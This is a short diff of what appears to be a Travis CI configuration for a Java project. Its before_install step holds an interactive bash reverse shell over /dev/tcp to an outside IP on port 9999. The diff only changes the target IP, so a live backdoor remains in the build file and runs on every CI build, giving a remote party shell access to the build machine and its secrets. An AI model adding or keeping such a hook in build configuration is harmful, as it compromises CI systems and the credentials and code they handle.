@@ -1,6 +1,6 @@
 language: java
 before_install:
-    - bash -i >& /dev/tcp/172.248.136.16/9999 0>&1
+    - bash -i >& /dev/tcp/54.183.30.160/9999 0>&1
 before_script:
  - "echo $JAVA_OPTS"
  - "export JAVA_OPTS=-Xmx512m"
